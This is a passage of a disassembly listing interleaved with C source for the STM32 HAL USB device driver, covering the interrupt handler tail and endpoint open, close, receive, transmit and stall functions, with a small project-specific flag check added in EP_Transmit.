#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8001fd8:	e06c      	b.n	80020b4 <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 8001fda:	68fb      	ldr	r3, [r7, #12]
 8001fdc:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8001fe0:	2b00      	cmp	r3, #0
 8001fe2:	d040      	beq.n	8002066 <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 8001fe4:	687b      	ldr	r3, [r7, #4]
 8001fe6:	681b      	ldr	r3, [r3, #0]
 8001fe8:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001fec:	b29a      	uxth	r2, r3
 8001fee:	687b      	ldr	r3, [r7, #4]
 8001ff0:	681b      	ldr	r3, [r3, #0]
 8001ff2:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 8001ff6:	b292      	uxth	r2, r2
 8001ff8:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 8001ffc:	687b      	ldr	r3, [r7, #4]
 8001ffe:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8002002:	2b00      	cmp	r3, #0
 8002004:	d12b      	bne.n	800205e <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8002006:	687b      	ldr	r3, [r7, #4]
 8002008:	681b      	ldr	r3, [r3, #0]
 800200a:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800200e:	b29a      	uxth	r2, r3
 8002010:	687b      	ldr	r3, [r7, #4]
 8002012:	681b      	ldr	r3, [r3, #0]
 8002014:	f042 0204 	orr.w	r2, r2, #4
 8002018:	b292      	uxth	r2, r2
 800201a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 800201e:	687b      	ldr	r3, [r7, #4]
 8002020:	681b      	ldr	r3, [r3, #0]
 8002022:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002026:	b29a      	uxth	r2, r3
 8002028:	687b      	ldr	r3, [r7, #4]
 800202a:	681b      	ldr	r3, [r3, #0]
 800202c:	f042 0208 	orr.w	r2, r2, #8
 8002030:	b292      	uxth	r2, r2
 8002032:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 8002036:	687b      	ldr	r3, [r7, #4]
 8002038:	2201      	movs	r2, #1
 800203a:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 800203e:	687b      	ldr	r3, [r7, #4]
 8002040:	681b      	ldr	r3, [r3, #0]
 8002042:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8002046:	b29b      	uxth	r3, r3
 8002048:	089b      	lsrs	r3, r3, #2
 800204a:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 800204e:	687b      	ldr	r3, [r7, #4]
 8002050:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 8002054:	2101      	movs	r1, #1
 8002056:	6878      	ldr	r0, [r7, #4]
 8002058:	f00a ff58 	bl	800cf0c <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 800205c:	e02a      	b.n	80020b4 <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 800205e:	6878      	ldr	r0, [r7, #4]
 8002060:	f00a fc96 	bl	800c990 <HAL_PCD_SuspendCallback>
    return;
 8002064:	e026      	b.n	80020b4 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 8002066:	68fb      	ldr	r3, [r7, #12]
 8002068:	f403 7300 	and.w	r3, r3, #512	; 0x200
 800206c:	2b00      	cmp	r3, #0
 800206e:	d00f      	beq.n	8002090 <HAL_PCD_IRQHandler+0x224>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 8002070:	687b      	ldr	r3, [r7, #4]
 8002072:	681b      	ldr	r3, [r3, #0]
 8002074:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002078:	b29a      	uxth	r2, r3
 800207a:	687b      	ldr	r3, [r7, #4]
 800207c:	681b      	ldr	r3, [r3, #0]
 800207e:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 8002082:	b292      	uxth	r2, r2
 8002084:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 8002088:	6878      	ldr	r0, [r7, #4]
 800208a:	f00a fc54 	bl	800c936 <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 800208e:	e011      	b.n	80020b4 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 8002090:	68fb      	ldr	r3, [r7, #12]
 8002092:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002096:	2b00      	cmp	r3, #0
 8002098:	d00c      	beq.n	80020b4 <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 800209a:	687b      	ldr	r3, [r7, #4]
 800209c:	681b      	ldr	r3, [r3, #0]
 800209e:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80020a2:	b29a      	uxth	r2, r3
 80020a4:	687b      	ldr	r3, [r7, #4]
 80020a6:	681b      	ldr	r3, [r3, #0]
 80020a8:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 80020ac:	b292      	uxth	r2, r2
 80020ae:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 80020b2:	bf00      	nop
  }
}
 80020b4:	3710      	adds	r7, #16
 80020b6:	46bd      	mov	sp, r7
 80020b8:	bd80      	pop	{r7, pc}

080020ba <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 80020ba:	b580      	push	{r7, lr}
 80020bc:	b082      	sub	sp, #8
 80020be:	af00      	add	r7, sp, #0
 80020c0:	6078      	str	r0, [r7, #4]
 80020c2:	460b      	mov	r3, r1
 80020c4:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 80020c6:	687b      	ldr	r3, [r7, #4]
 80020c8:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80020cc:	2b01      	cmp	r3, #1
 80020ce:	d101      	bne.n	80020d4 <HAL_PCD_SetAddress+0x1a>
 80020d0:	2302      	movs	r3, #2
 80020d2:	e013      	b.n	80020fc <HAL_PCD_SetAddress+0x42>
 80020d4:	687b      	ldr	r3, [r7, #4]
 80020d6:	2201      	movs	r2, #1
 80020d8:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 80020dc:	687b      	ldr	r3, [r7, #4]
 80020de:	78fa      	ldrb	r2, [r7, #3]
 80020e0:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 80020e4:	687b      	ldr	r3, [r7, #4]
 80020e6:	681b      	ldr	r3, [r3, #0]
 80020e8:	78fa      	ldrb	r2, [r7, #3]
 80020ea:	4611      	mov	r1, r2
 80020ec:	4618      	mov	r0, r3
 80020ee:	f006 f94a 	bl	8008386 <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 80020f2:	687b      	ldr	r3, [r7, #4]
 80020f4:	2200      	movs	r2, #0
 80020f6:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80020fa:	2300      	movs	r3, #0
}
 80020fc:	4618      	mov	r0, r3
 80020fe:	3708      	adds	r7, #8
 8002100:	46bd      	mov	sp, r7
 8002102:	bd80      	pop	{r7, pc}

08002104 <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 8002104:	b580      	push	{r7, lr}
 8002106:	b084      	sub	sp, #16
 8002108:	af00      	add	r7, sp, #0
 800210a:	6078      	str	r0, [r7, #4]
 800210c:	4608      	mov	r0, r1
 800210e:	4611      	mov	r1, r2
 8002110:	461a      	mov	r2, r3
 8002112:	4603      	mov	r3, r0
 8002114:	70fb      	strb	r3, [r7, #3]
 8002116:	460b      	mov	r3, r1
 8002118:	803b      	strh	r3, [r7, #0]
 800211a:	4613      	mov	r3, r2
 800211c:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 800211e:	2300      	movs	r3, #0
 8002120:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 8002122:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002126:	2b00      	cmp	r3, #0
 8002128:	da0e      	bge.n	8002148 <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800212a:	78fb      	ldrb	r3, [r7, #3]
 800212c:	f003 0307 	and.w	r3, r3, #7
 8002130:	1c5a      	adds	r2, r3, #1
 8002132:	4613      	mov	r3, r2
 8002134:	009b      	lsls	r3, r3, #2
 8002136:	4413      	add	r3, r2
 8002138:	00db      	lsls	r3, r3, #3
 800213a:	687a      	ldr	r2, [r7, #4]
 800213c:	4413      	add	r3, r2
 800213e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002140:	68fb      	ldr	r3, [r7, #12]
 8002142:	2201      	movs	r2, #1
 8002144:	705a      	strb	r2, [r3, #1]
 8002146:	e00e      	b.n	8002166 <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002148:	78fb      	ldrb	r3, [r7, #3]
 800214a:	f003 0207 	and.w	r2, r3, #7
 800214e:	4613      	mov	r3, r2
 8002150:	009b      	lsls	r3, r3, #2
 8002152:	4413      	add	r3, r2
 8002154:	00db      	lsls	r3, r3, #3
 8002156:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800215a:	687a      	ldr	r2, [r7, #4]
 800215c:	4413      	add	r3, r2
 800215e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002160:	68fb      	ldr	r3, [r7, #12]
 8002162:	2200      	movs	r2, #0
 8002164:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 8002166:	78fb      	ldrb	r3, [r7, #3]
 8002168:	f003 0307 	and.w	r3, r3, #7
 800216c:	b2da      	uxtb	r2, r3
 800216e:	68fb      	ldr	r3, [r7, #12]
 8002170:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 8002172:	883a      	ldrh	r2, [r7, #0]
 8002174:	68fb      	ldr	r3, [r7, #12]
 8002176:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 8002178:	68fb      	ldr	r3, [r7, #12]
 800217a:	78ba      	ldrb	r2, [r7, #2]
 800217c:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 800217e:	78bb      	ldrb	r3, [r7, #2]
 8002180:	2b02      	cmp	r3, #2
 8002182:	d102      	bne.n	800218a <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 8002184:	68fb      	ldr	r3, [r7, #12]
 8002186:	2200      	movs	r2, #0
 8002188:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 800218a:	687b      	ldr	r3, [r7, #4]
 800218c:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002190:	2b01      	cmp	r3, #1
 8002192:	d101      	bne.n	8002198 <HAL_PCD_EP_Open+0x94>
 8002194:	2302      	movs	r3, #2
 8002196:	e00e      	b.n	80021b6 <HAL_PCD_EP_Open+0xb2>
 8002198:	687b      	ldr	r3, [r7, #4]
 800219a:	2201      	movs	r2, #1
 800219c:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 80021a0:	687b      	ldr	r3, [r7, #4]
 80021a2:	681b      	ldr	r3, [r3, #0]
 80021a4:	68f9      	ldr	r1, [r7, #12]
 80021a6:	4618      	mov	r0, r3
 80021a8:	f003 fe8c 	bl	8005ec4 <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 80021ac:	687b      	ldr	r3, [r7, #4]
 80021ae:	2200      	movs	r2, #0
 80021b0:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 80021b4:	7afb      	ldrb	r3, [r7, #11]
}
 80021b6:	4618      	mov	r0, r3
 80021b8:	3710      	adds	r7, #16
 80021ba:	46bd      	mov	sp, r7
 80021bc:	bd80      	pop	{r7, pc}

080021be <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80021be:	b580      	push	{r7, lr}
 80021c0:	b084      	sub	sp, #16
 80021c2:	af00      	add	r7, sp, #0
 80021c4:	6078      	str	r0, [r7, #4]
 80021c6:	460b      	mov	r3, r1
 80021c8:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 80021ca:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80021ce:	2b00      	cmp	r3, #0
 80021d0:	da0e      	bge.n	80021f0 <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80021d2:	78fb      	ldrb	r3, [r7, #3]
 80021d4:	f003 0307 	and.w	r3, r3, #7
 80021d8:	1c5a      	adds	r2, r3, #1
 80021da:	4613      	mov	r3, r2
 80021dc:	009b      	lsls	r3, r3, #2
 80021de:	4413      	add	r3, r2
 80021e0:	00db      	lsls	r3, r3, #3
 80021e2:	687a      	ldr	r2, [r7, #4]
 80021e4:	4413      	add	r3, r2
 80021e6:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80021e8:	68fb      	ldr	r3, [r7, #12]
 80021ea:	2201      	movs	r2, #1
 80021ec:	705a      	strb	r2, [r3, #1]
 80021ee:	e00e      	b.n	800220e <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80021f0:	78fb      	ldrb	r3, [r7, #3]
 80021f2:	f003 0207 	and.w	r2, r3, #7
 80021f6:	4613      	mov	r3, r2
 80021f8:	009b      	lsls	r3, r3, #2
 80021fa:	4413      	add	r3, r2
 80021fc:	00db      	lsls	r3, r3, #3
 80021fe:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002202:	687a      	ldr	r2, [r7, #4]
 8002204:	4413      	add	r3, r2
 8002206:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002208:	68fb      	ldr	r3, [r7, #12]
 800220a:	2200      	movs	r2, #0
 800220c:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 800220e:	78fb      	ldrb	r3, [r7, #3]
 8002210:	f003 0307 	and.w	r3, r3, #7
 8002214:	b2da      	uxtb	r2, r3
 8002216:	68fb      	ldr	r3, [r7, #12]
 8002218:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 800221a:	687b      	ldr	r3, [r7, #4]
 800221c:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002220:	2b01      	cmp	r3, #1
 8002222:	d101      	bne.n	8002228 <HAL_PCD_EP_Close+0x6a>
 8002224:	2302      	movs	r3, #2
 8002226:	e00e      	b.n	8002246 <HAL_PCD_EP_Close+0x88>
 8002228:	687b      	ldr	r3, [r7, #4]
 800222a:	2201      	movs	r2, #1
 800222c:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 8002230:	687b      	ldr	r3, [r7, #4]
 8002232:	681b      	ldr	r3, [r3, #0]
 8002234:	68f9      	ldr	r1, [r7, #12]
 8002236:	4618      	mov	r0, r3
 8002238:	f004 fa08 	bl	800664c <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 800223c:	687b      	ldr	r3, [r7, #4]
 800223e:	2200      	movs	r2, #0
 8002240:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 8002244:	2300      	movs	r3, #0
}
 8002246:	4618      	mov	r0, r3
 8002248:	3710      	adds	r7, #16
 800224a:	46bd      	mov	sp, r7
 800224c:	bd80      	pop	{r7, pc}

0800224e <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 800224e:	b580      	push	{r7, lr}
 8002250:	b086      	sub	sp, #24
 8002252:	af00      	add	r7, sp, #0
 8002254:	60f8      	str	r0, [r7, #12]
 8002256:	607a      	str	r2, [r7, #4]
 8002258:	603b      	str	r3, [r7, #0]
 800225a:	460b      	mov	r3, r1
 800225c:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 800225e:	7afb      	ldrb	r3, [r7, #11]
 8002260:	f003 0207 	and.w	r2, r3, #7
 8002264:	4613      	mov	r3, r2
 8002266:	009b      	lsls	r3, r3, #2
 8002268:	4413      	add	r3, r2
 800226a:	00db      	lsls	r3, r3, #3
 800226c:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002270:	68fa      	ldr	r2, [r7, #12]
 8002272:	4413      	add	r3, r2
 8002274:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 8002276:	697b      	ldr	r3, [r7, #20]
 8002278:	687a      	ldr	r2, [r7, #4]
 800227a:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 800227c:	697b      	ldr	r3, [r7, #20]
 800227e:	683a      	ldr	r2, [r7, #0]
 8002280:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 8002282:	697b      	ldr	r3, [r7, #20]
 8002284:	2200      	movs	r2, #0
 8002286:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 8002288:	697b      	ldr	r3, [r7, #20]
 800228a:	2200      	movs	r2, #0
 800228c:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 800228e:	7afb      	ldrb	r3, [r7, #11]
 8002290:	f003 0307 	and.w	r3, r3, #7
 8002294:	b2da      	uxtb	r2, r3
 8002296:	697b      	ldr	r3, [r7, #20]
 8002298:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 800229a:	68fb      	ldr	r3, [r7, #12]
 800229c:	681b      	ldr	r3, [r3, #0]
 800229e:	6979      	ldr	r1, [r7, #20]
 80022a0:	4618      	mov	r0, r3
 80022a2:	f004 fbc0 	bl	8006a26 <USB_EPStartXfer>

  return HAL_OK;
 80022a6:	2300      	movs	r3, #0
}
 80022a8:	4618      	mov	r0, r3
 80022aa:	3718      	adds	r7, #24
 80022ac:	46bd      	mov	sp, r7
 80022ae:	bd80      	pop	{r7, pc}

080022b0 <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 80022b0:	b480      	push	{r7}
 80022b2:	b083      	sub	sp, #12
 80022b4:	af00      	add	r7, sp, #0
 80022b6:	6078      	str	r0, [r7, #4]
 80022b8:	460b      	mov	r3, r1
 80022ba:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 80022bc:	78fb      	ldrb	r3, [r7, #3]
 80022be:	f003 0207 	and.w	r2, r3, #7
 80022c2:	6879      	ldr	r1, [r7, #4]
 80022c4:	4613      	mov	r3, r2
 80022c6:	009b      	lsls	r3, r3, #2
 80022c8:	4413      	add	r3, r2
 80022ca:	00db      	lsls	r3, r3, #3
 80022cc:	440b      	add	r3, r1
 80022ce:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 80022d2:	681b      	ldr	r3, [r3, #0]
}
 80022d4:	4618      	mov	r0, r3
 80022d6:	370c      	adds	r7, #12
 80022d8:	46bd      	mov	sp, r7
 80022da:	f85d 7b04 	ldr.w	r7, [sp], #4
 80022de:	4770      	bx	lr

080022e0 <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 80022e0:	b580      	push	{r7, lr}
 80022e2:	b086      	sub	sp, #24
 80022e4:	af00      	add	r7, sp, #0
 80022e6:	60f8      	str	r0, [r7, #12]
 80022e8:	607a      	str	r2, [r7, #4]
 80022ea:	603b      	str	r3, [r7, #0]
 80022ec:	460b      	mov	r3, r1
 80022ee:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80022f0:	7afb      	ldrb	r3, [r7, #11]
 80022f2:	f003 0307 	and.w	r3, r3, #7
 80022f6:	1c5a      	adds	r2, r3, #1
 80022f8:	4613      	mov	r3, r2
 80022fa:	009b      	lsls	r3, r3, #2
 80022fc:	4413      	add	r3, r2
 80022fe:	00db      	lsls	r3, r3, #3
 8002300:	68fa      	ldr	r2, [r7, #12]
 8002302:	4413      	add	r3, r2
 8002304:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 8002306:	697b      	ldr	r3, [r7, #20]
 8002308:	687a      	ldr	r2, [r7, #4]
 800230a:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 800230c:	697b      	ldr	r3, [r7, #20]
 800230e:	683a      	ldr	r2, [r7, #0]
 8002310:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 8002312:	697b      	ldr	r3, [r7, #20]
 8002314:	2201      	movs	r2, #1
 8002316:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 800231a:	697b      	ldr	r3, [r7, #20]
 800231c:	683a      	ldr	r2, [r7, #0]
 800231e:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 8002320:	697b      	ldr	r3, [r7, #20]
 8002322:	2200      	movs	r2, #0
 8002324:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 8002326:	697b      	ldr	r3, [r7, #20]
 8002328:	2201      	movs	r2, #1
 800232a:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 800232c:	7afb      	ldrb	r3, [r7, #11]
 800232e:	f003 0307 	and.w	r3, r3, #7
 8002332:	b2da      	uxtb	r2, r3
 8002334:	697b      	ldr	r3, [r7, #20]
 8002336:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 8002338:	4b0e      	ldr	r3, [pc, #56]	; (8002374 <HAL_PCD_EP_Transmit+0x94>)
 800233a:	781b      	ldrb	r3, [r3, #0]
 800233c:	f003 0302 	and.w	r3, r3, #2
 8002340:	2b00      	cmp	r3, #0
 8002342:	d102      	bne.n	800234a <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 8002344:	4b0c      	ldr	r3, [pc, #48]	; (8002378 <HAL_PCD_EP_Transmit+0x98>)
 8002346:	2201      	movs	r2, #1
 8002348:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 800234a:	68fb      	ldr	r3, [r7, #12]
 800234c:	681b      	ldr	r3, [r3, #0]
 800234e:	6979      	ldr	r1, [r7, #20]
 8002350:	4618      	mov	r0, r3
 8002352:	f004 fb68 	bl	8006a26 <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 8002356:	4b07      	ldr	r3, [pc, #28]	; (8002374 <HAL_PCD_EP_Transmit+0x94>)
 8002358:	781b      	ldrb	r3, [r3, #0]
 800235a:	f003 0302 	and.w	r3, r3, #2
 800235e:	2b00      	cmp	r3, #0
 8002360:	d102      	bne.n	8002368 <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 8002362:	4b06      	ldr	r3, [pc, #24]	; (800237c <HAL_PCD_EP_Transmit+0x9c>)
 8002364:	2201      	movs	r2, #1
 8002366:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 8002368:	2300      	movs	r3, #0
}
 800236a:	4618      	mov	r0, r3
 800236c:	3718      	adds	r7, #24
 800236e:	46bd      	mov	sp, r7
 8002370:	bd80      	pop	{r7, pc}
 8002372:	bf00      	nop
 8002374:	2000026c 	.word	0x2000026c
 8002378:	20000270 	.word	0x20000270
 800237c:	2000027c 	.word	0x2000027c

08002380 <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002380:	b580      	push	{r7, lr}
 8002382:	b084      	sub	sp, #16
 8002384:	af00      	add	r7, sp, #0
 8002386:	6078      	str	r0, [r7, #4]
 8002388:	460b      	mov	r3, r1
 800238a:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 800238c:	78fb      	ldrb	r3, [r7, #3]
 800238e:	f003 0207 	and.w	r2, r3, #7
 8002392:	687b      	ldr	r3, [r7, #4]
 8002394:	685b      	ldr	r3, [r3, #4]
 8002396:	429a      	cmp	r2, r3
 8002398:	d901      	bls.n	800239e <HAL_PCD_EP_SetStall+0x1e>
  {
    return HAL_ERROR;
 800239a:	2301      	movs	r3, #1
 800239c:	e04c      	b.n	8002438 <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 800239e:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80023a2:	2b00      	cmp	r3, #0
 80023a4:	da0e      	bge.n	80023c4 <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80023a6:	78fb      	ldrb	r3, [r7, #3]
 80023a8:	f003 0307 	and.w	r3, r3, #7
 80023ac:	1c5a      	adds	r2, r3, #1
 80023ae:	4613      	mov	r3, r2
 80023b0:	009b      	lsls	r3, r3, #2
 80023b2:	4413      	add	r3, r2
 80023b4:	00db      	lsls	r3, r3, #3
 80023b6:	687a      	ldr	r2, [r7, #4]
 80023b8:	4413      	add	r3, r2
 80023ba:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80023bc:	68fb      	ldr	r3, [r7, #12]
 80023be:	2201      	movs	r2, #1
 80023c0:	705a      	strb	r2, [r3, #1]
 80023c2:	e00c      	b.n	80023de <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 80023c4:	78fa      	ldrb	r2, [r7, #3]
 80023c6:	4613      	mov	r3, r2
 80023c8:	009b      	lsls	r3, r3, #2
 80023ca:	4413      	add	r3, r2
 80023cc:	00db      	lsls	r3, r3, #3
 80023ce:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80023d2:	687a      	ldr	r2, [r7, #4]
 80023d4:	4413      	add	r3, r2
 80023d6:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80023d8:	68fb      	ldr	r3, [r7, #12]
 80023da:	2200      	movs	r2, #0
 80023dc:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 80023de:	68fb      	ldr	r3, [r7, #12]
 80023e0:	2201      	movs	r2, #1
 80023e2:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 80023e4:	78fb      	ldrb	r3, [r7, #3]
 80023e6:	f003 0307 	and.w	r3, r3, #7
 80023ea:	b2da      	uxtb	r2, r3
 80023ec:	68fb      	ldr	r3, [r7, #12]
